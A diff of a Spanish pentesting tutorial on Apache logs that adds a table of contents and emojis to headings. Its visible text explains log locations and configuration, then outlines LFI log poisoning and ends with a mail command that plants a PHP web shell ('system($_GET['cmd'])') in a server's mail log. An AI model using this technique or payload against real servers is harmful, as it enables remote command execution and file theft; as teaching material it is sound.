@@ -1,6 +1,16 @@
+# Índice
+- [📝¿QUÉ ES UN LOG?](#qué-es-un-log)
+- [📁Ubicación de los logs](#ubicación-de-los-logs)
+- [🛠️Configuración](#configuración)
+- [🔥Tipos de logs en Apache](#tipos-de-logs-en-apache)
+  - [1️⃣ Access log (`access.log`)](#1-access-log-accesslog)
+  - [2️⃣ Error log (`error.log`)](#2-error-log-errorlog)
+- [💣LFI, LOG POISONING](#lfi-log-poisoning)
+- [📡Verificar si el servidor interpreta PHP en los logs](#verificar-si-el-servidor-interpreta-php-en-los-logs)
+- [📝Resumen](#resumen)
+- [📧Ataques vía mail](#ataques-vía-mail)
 
-
-## ¿QUÉ ES UN LOG?
+## 📝¿QUÉ ES UN LOG?
 
 Un log en **Apache** es un archivo donde el servidor web **Apache HTTP Server** registra información sobre su actividad.
 
@@ -11,14 +21,14 @@ Estos registros son útiles para:
 - analizar el rendimiento
 - detectar posibles ataques o comportamientos anómalos
 
-## Ubicación de los logs
+## 📁Ubicación de los logs
 
 La ubicación depende de la configuración y del sistema operativo, pero comúnmente:
 
 - **Linux:** `/var/log/apache2/` o `/var/log/httpd/`
 - **Windows:** dentro del directorio de instalación de Apache
 
-## Configuración
+## 🛠️Configuración
 
 Los logs se configuran en el archivo de configuración de Apache (`httpd.conf` o `apache2.conf`) mediante las siguientes directivas:
 
@@ -27,7 +37,7 @@ CustomLog "/var/log/apache2/access.log" combined
 ErrorLog "/var/log/apache2/error.log"
 ```
 
-## Tipos de logs en Apache
+## 🔥Tipos de logs en Apache
 
 ### 1️⃣ Access log (`access.log`)
 
@@ -61,7 +71,7 @@ Incluye:
 ```
 
 
-### LFI, LOG POISONING
+### 💣LFI, LOG POISONING
 
 Sabiendo lo que son los logs, si llegamos a tener acceso a ellos, podemos intentar aprovecharlo para ejecutar código malicioso.
 
@@ -105,7 +115,7 @@ Con esto podemos leer salidas en el log, y también archivos del sistema, como `
 
 ---
 
-### Verificar si el servidor interpreta PHP en los logs
+### 📡Verificar si el servidor interpreta PHP en los logs
 
 Si además el servidor interpreta PHP dentro de esos logs, podemos enviar código malicioso directamente con `curl`:
 
@@ -137,13 +147,13 @@ Si logramos incrustar código PHP en el log y que luego sea interpretado, podrem
 
 ---
 
-**Resumen:**  
+📝**Resumen:**  
 - Accedemos a archivos de logs vía LFI  
 - Inyectamos código PHP malicioso en los logs (log poisoning)  
 - Si el log se interpreta como PHP, ejecutamos código remoto usando el parámetro `cmd` para pasar el comando  
 - Esto permite ejecutar comandos en el servidor y leer archivos sensibles
 
-En algunos casos podremos hacer lo mismo vía mail:
+📧En algunos casos podremos hacer lo mismo vía mail:
 
 ```bash
 mail -s "<?php system(\$_GET['cmd']); ?>" www-data@10.10.10.10 < /dev/null
